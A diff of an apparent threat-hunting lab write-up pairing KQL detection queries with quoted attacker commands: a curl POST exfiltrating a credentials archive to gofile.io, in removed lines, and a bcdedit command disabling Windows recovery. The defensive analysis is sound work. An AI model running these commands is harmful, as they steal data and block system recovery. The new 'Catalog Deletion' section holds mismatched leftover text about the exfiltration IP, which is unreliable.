@@ -363,28 +363,32 @@ DeviceProcessEvents
 
 ### 18. Impact: Recovery Disabled
 
-Searched for evidence of...
-
-data exfiltration and discovered the HTTP POST command used to upload stolen data archives to cloud storage. The attacker executed the following curl with form-based POST upload command to exfiltrate the first archive (credentials.tar.gz) to gofile.io: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile. This command pattern was repeated for all the other archives. The exfiltration service domain (i.e., gofile.io), is an anonymous cloud storage service that provides temporary file hosting with self-destructing links. It is commonly used for malware distribution and data exfiltration due to no registration requirement and high-speed transfers.
+Searched for evidence of recovery environment disabling events and discovered that the threat actor executed the following command to disable the Windows Recovery Environment: "bcdedit" /set {default} recoveryenabled No. Therefore, the Windows Recovery Environment was permanently disabled using bcdedit, preventing users from booting into recovery mode to restore their system or access repair tools. This effectively removed another critical recovery path.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
-| where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine has "curl" and ProcessCommandLine has "POST"
-| project TimeGenerated, ProcessCommandLine
-| order by TimeGenerated asc
+| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName contains "azuki"
+| where FileName in~ ("bcdedit.exe", "reg.exe", "powershell.exe", "wmic.exe", "diskpart.exe")
+| where ProcessCommandLine contains "recoveryenabled" 
+    or ProcessCommandLine contains "bootstatuspolicy"
+    or ProcessCommandLine contains "storage"
+    or ProcessCommandLine contains "quota"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| sort by TimeGenerated asc
 
 ```
-<img width="1845" height="670" alt="BT_Q22" src="https://github.com/user-attachments/assets/2dfd2e58-38cf-49b1-b06a-7aa43b7f2cb4" />
+<img width="2792" height="397" alt="DITW_Q21" src="https://github.com/user-attachments/assets/25686061-e6e3-43ae-b068-8a6f5551219d" />
 
 ---
 
-### 19. Exfiltration: Destination Server
+### 19. Impact: Catalog Deletion
 
-Searched for the exfiltration server IP address and discovered that the server IP that received the stolen data was 45.112.123.227. This IP address corresponds to gofile.io's upload infrastructure.
+Searched for evidence of...
+
+the exfiltration server IP address and discovered that the server IP that received the stolen data was 45.112.123.227. This IP address corresponds to gofile.io's upload infrastructure.
 
 **Query used to locate events:**
 
